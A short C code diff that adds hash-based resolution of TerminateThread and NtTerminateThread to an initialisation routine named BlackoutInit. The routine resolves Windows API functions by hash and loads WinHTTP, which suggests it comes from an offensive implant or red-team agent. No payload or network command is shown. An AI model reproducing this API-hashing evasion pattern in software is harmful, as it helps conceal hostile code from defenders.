@@ -76,6 +76,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.ResumeThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ResumeThread" )  );
     Instance()->Win32.SuspendThread             = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SuspendThread" )  );
     Instance()->Win32.GetMappedFileNameA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
+    Instance()->Win32.TerminateThread           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
 
     Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
     Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
@@ -115,6 +116,8 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtResumeThread            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtResumeThread" ) ); 
     Instance()->Win32.NtSuspendThread           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendThread" ) ); 
     Instance()->Win32.NtSuspendProcess          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSuspendProcess" ) ); 
+    Instance()->Win32.NtTerminateThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTerminateThread" ) ); 
+
 
     Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
     Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
